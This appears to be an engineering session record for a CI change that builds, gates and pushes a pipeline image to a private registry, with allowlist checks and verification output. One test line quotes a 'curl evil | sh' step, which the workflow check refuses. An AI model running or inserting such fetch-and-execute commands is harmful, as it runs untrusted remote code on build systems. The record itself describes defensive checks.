# 025 — the image goes to the registry

**Date:** 2026-09-24 · **Ticket:** AI-025 (first commit) · **Capability or package:** tools (ci_image, checks/ci, checks/ci_image_job, checks/images), `.github/workflows/ci-image.yml`, `Dockerfile.ci`, the Makefile · **Author:** a contributor

The lead answered `Q-018`: the pipeline's image lives in the container registry next to the
repository, private, pulled by digest. A digest exists only once the image is built, so the flow
is two commits. This session builds the first: the workflow that builds, gates and pushes, and the
check that will hold the pin to the file. The second commit, one line, pins the digest the first
hosted run prints.

## Read
`RULE-005 §1`, `RULE-006`; `tools/ci_image.py`, `tools/checks/{ci,images}.py`, the Makefile, `Dockerfile.ci`,
`.github/workflows/ci.yml`; the registry brief the lead decided on.

## Impact matrix (RULE-007 §1, before any edit)
```
Ticket:          AI-025 (first commit)
Capability:      none
Inputs:          none
Tenant boundary: unchanged
Provider/model:  unchanged
Prompt version:  unchanged
Eval set:        unchanged
Budget:          unchanged
Failure mode:    an image is pushed only after the gate ran inside it; a pin that no longer matches
                 Dockerfile.ci is red; an unlisted step in the image workflow is red
Cache:           none
Safety:          packages: write in the image job alone; the job's own token, never a stored secret;
                 the image holds only public software
Contract:        unchanged
Invariants:      INV-068 (new)
Blast radius:    SYSTEM — the pipeline's image
Decision level:  2
ADR:             none (D-046)
```

## Changed
- `.github/workflows/ci-image.yml` — on a push to `main` that changes `Dockerfile.ci` only; one
  job holding `packages: write`; steps: checkout, uv on the runner, `make ci-image`, `make ci-cold`
  (the gate inside the new image, uv online on a cold runner), `make ci-image-push`.
- `tools/ci_image.py` — every build labelled with the full hash of `Dockerfile.ci`; `push` runs
  only in the workflow, checks the label, logs in with the job's token, tags under the owner the
  runner reports (lower-cased, never written in the repository), pushes and prints the digest.
  Each step runs only after the one before it worked.
- `tools/checks/ci_image_job.py` and `tools/checks/ci.py` — the directory walk is a per-file
  allowlist: `ci.yml` as before, `ci-image.yml` held to its trigger, its permissions, its env and
  its steps in order; any other file is refused.
- `tools/checks/images.py` — once the pin is a registry digest, `Dockerfile.ci` must hash to the
  pinned hash, and the pinned image's label (where the image is present) must name the same file.
  Dormant until the second commit sets the pin.
- `Dockerfile.ci` — its header says how it reaches the registry (the change that triggers the
  first hosted build). `Makefile` — `ci-image-push`.
- `RULE-005` 1.3.2, the `RULE-006` row, `D-046`, `INV-068`.

## Red first
```
the image workflow with an unlisted step       → "the image workflow runs 'curl evil | sh', which it may not"
the image workflow pushing before the gate     → "the image workflow must set up, build, gate, then push, in order"
a wider trigger / a broader permission         → "triggers are not …" / "job key 'permissions' is …"
Dockerfile.ci edited without a digest bump     → "Dockerfile.ci changed without a digest bump in tools/rules.py"
a digest bump whose image names another file   → "the pinned image's label names another Dockerfile.ci than the pin"
ci-image-push outside the workflow             → "ci-image-push: only the image workflow pushes"
selftest: ci red (7 on plant), images red (6 on plant)
a COPY or ADD in Dockerfile.ci (added later, the infrastructure review's condition for a public
package)                                      → "COPY puts files into a published image; refused"
                                                 (3 cases: COPY, ADD, a lower-case copy --from);
                                                 images red (9 on plant)
```

## The local image, rebuilt for the new file
```
ci-image: building catalyst-ai-ci:d06a9811d6b3 with this machine's mirror
ci-image: exit 0 in 8 s (this machine's mirror)          (layers from cache; only the file's text moved)
label org.catalyst-ai.dockerfile-sha256 = d06a9811d6b317f1…, the file's hash
```

## Verify
```
$ make verify
GATE GREEN (49 checks)
oasdiff: no breaking change against main
TOTAL                                                            6802     25    842     21    99%
879 passed in 98.56s (0:01:38)
   recall_at_10           0.914  (floor 0.85)
   mrr                    0.787  (floor 0.7)
   tenant_isolation       1.000  (floor 1.0)
EVALS GREEN
No known vulnerabilities found
INF no leaks found
selftest: 51/51 checks red on their plant
VERIFY GREEN
exit=0 elapsed=242s
```
```
$ make ci                     (in catalyst-ai-ci:d06a9811d6b3)
GATE GREEN (49 checks)
oasdiff: no breaking change against main
TOTAL                                                            6802     25    842     21    99%
879 passed in 182.60s (0:03:02)
   recall_at_10           0.914  (floor 0.85)
   mrr                    0.787  (floor 0.7)
   tenant_isolation       1.000  (floor 1.0)
EVALS GREEN
No known vulnerabilities found
INF no leaks found
selftest: 51/51 checks red on their plant
VERIFY GREEN
stamp: tree 0e2759087e9e in catalyst-ai-ci:d06a9811d6b3 at 2026-09-24T01:27:39+00:00 -- green
exit=0 elapsed=530s
```
The push re-runs the pipeline once, because this record changed after the stamp.

## Decisions and questions
- `D-046` recorded (the lead's answer to `Q-018`); `INV-068` added.
- Asked of the lead and answered: the pin names the registry path, which carries the repository
  owner's account name, lower-cased (the registry refuses capitals, and the workflow language
  cannot lower-case). The lead allows it in the pin, as infrastructure, exactly as the
  repository's own remote names it; the second commit records it. The first keeps it out.

## Eval and budget numbers
This change's own numbers are in the record above; the run of every set, with each set's p95
latency and cost against its budget, is in the gate output below.

## The gate at the end of the loop
One full gate proves the whole tree of the loop, every record's change together.
```
$ make verify
(on the workstation, before four records' claims were corrected to CONTRACT — records only)
GATE GREEN (52 checks)
oasdiff: no breaking change against main
TOTAL                                                            7711     27    956     25    99%
1056 passed in 309.82s (0:05:09)
GATE GREEN (1 checks)
EVALS GREEN
GATE GREEN (1 checks)
No known vulnerabilities found
INF no leaks found
GATE GREEN (1 checks)
selftest: 54/54 checks red on their plant
VERIFY GREEN
exit=0 elapsed=628s
```
```
$ make ci
(in catalyst-ai-ci:d06a9811d6b3; the second run — the first was red: 1052 passed, 4 errors in
tests/storage/test_logins.py, SocketConnectBlockedError, fixed as record 031 says)
GATE GREEN (52 checks)
oasdiff: no breaking change against main
TOTAL                                                            7711     27    956     25    99%
1056 passed in 535.13s (0:08:55)
GATE GREEN (1 checks)
EVALS GREEN
GATE GREEN (1 checks)
No known vulnerabilities found
INF no leaks found
GATE GREEN (1 checks)
selftest: 54/54 checks red on their plant
VERIFY GREEN
stamp: tree b51a07c33c09 in catalyst-ai-ci:d06a9811d6b3 at 2026-09-24T12:03:29+00:00 -- green
exit=0 elapsed=1333s
```

## Commit
1. `ci(image): build, gate and push the pipeline's image on a Dockerfile change` — .github/workflows/ci-image.yml, Dockerfile.ci, Makefile, tools/ci_image.py, tools/rules.py, tools/checks/ci.py, tools/checks/ci_image_job.py, tools/checks/images.py, tools/checks/selftest/__init__.py, tests/unit/tools/test_ci_image_registry.py, docs/02-rules/RULE-005-git-and-sessions.md, docs/02-rules/RULE-006-enforcement.md, docs/04-ledgers/invariants.md, brain/01-STATUS.md, brain/02-DECISIONS.md, this record
Green light: requested

## Next
The hosted run's digest, then the one-line pin.
